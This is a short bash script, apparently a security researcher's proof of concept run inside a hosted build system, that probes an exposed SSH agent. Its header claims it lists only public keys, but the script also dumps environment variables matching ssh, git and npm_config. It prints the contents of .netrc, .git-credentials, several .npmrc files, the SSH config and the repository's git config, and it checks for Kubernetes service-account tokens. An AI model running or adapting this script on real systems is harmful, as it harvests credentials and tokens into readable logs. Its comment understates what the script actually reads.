#!/usr/bin/env bash
# Prove EXPOSURE of the build-stage SSH agent to customer code.
# Lists agent identities + public keys ONLY. Does not export private material
# and does not authenticate to any host.
set +e
B="YEXTP1SSH"; echo "$B-BEGIN"
echo "$B id=$(id)"
echo "$B SSH_AUTH_SOCK=${SSH_AUTH_SOCK:-UNSET}"
echo "$B-ENVSSH-START"; env | grep -ai 'ssh\|git\|npm_config' ; echo "$B-ENVSSH-END"
echo "$B sock_ls=$(ls -la "$SSH_AUTH_SOCK" 2>&1)"
echo "$B sock_r=$([ -r "$SSH_AUTH_SOCK" ] && echo YES || echo NO) sock_w=$([ -w "$SSH_AUTH_SOCK" ] && echo YES || echo NO)"
echo "$B-AGENT-START"
echo "-- ssh-add -l (fingerprints) --"; ssh-add -l 2>&1
echo "-- ssh-add -L (PUBLIC keys) --";  ssh-add -L 2>&1
echo "$B-AGENT-END"
echo "$B-K8S-START"
ls -la /var/run/secrets/ 2>&1 | head -20; ls -la /run/secrets/ 2>&1 | head -20
for f in token namespace ca.crt; do p=/var/run/secrets/kubernetes.io/serviceaccount/$f; echo "$B k8s:$f=$([ -f "$p" ] && echo PRESENT || echo absent)"; done
echo "$B-K8S-END"
echo "$B-CREDFILES-START"
for f in "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.npmrc" /opt/buildhome/.npmrc /opt/buildhome/repo/.npmrc "$HOME/.ssh/config" "$HOME/.ssh/known_hosts"; do
  echo "--- $f ($([ -f "$f" ] && echo present || echo absent))"; [ -f "$f" ] && cat "$f" 2>&1
done
echo "$B-CREDFILES-END"
echo "$B-GITCFG-START"; cat /opt/buildhome/repo/.git/config 2>&1; echo "$B-GITCFG-END"
echo "$B-END"; exit 0
